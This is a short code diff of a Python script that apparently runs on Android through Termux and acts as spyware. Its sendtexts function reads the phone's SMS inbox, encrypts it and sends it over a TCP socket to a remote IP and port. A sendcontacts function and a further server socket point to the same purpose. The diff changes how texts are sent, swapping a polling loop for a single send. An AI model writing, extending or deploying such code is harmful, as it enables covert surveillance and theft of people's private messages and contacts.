@@ -47,24 +47,14 @@ def sendcontacts():
 def sendtexts():
     TextsRaw = subprocess.Popen(['termux-sms-inbox'], stdout=subprocess.PIPE)
     Texts = encrypt(bytes.decode(TextsRaw.communicate()[0]))
-    return bytes.encode(encrypt(Texts))
 
-
-def incomming_texts():
     SOCKET2 = socket(AF_INET, SOCK_STREAM)
     SOCKET2.connect((IP, PORT2))
 
-    while True:
-        TEXTS1 = sendtexts()
-        time.sleep(1)
-        TEXTS2 = sendtexts()
+    SOCKET2.send(bytes.encode(encrypt(Texts)))
 
-        if(TEXTS1 != TEXTS2):
-            SOCKET2.send(bytes.decode(decrypt(TEXTS2)))
+    SOCKET2.close()
 
-
-newthread = incomming_texts()
-newthread.start()
 
 # Definging the serversocket variable and setting it to use the TCP protocol
 SOCKET = socket(AF_INET, SOCK_STREAM)
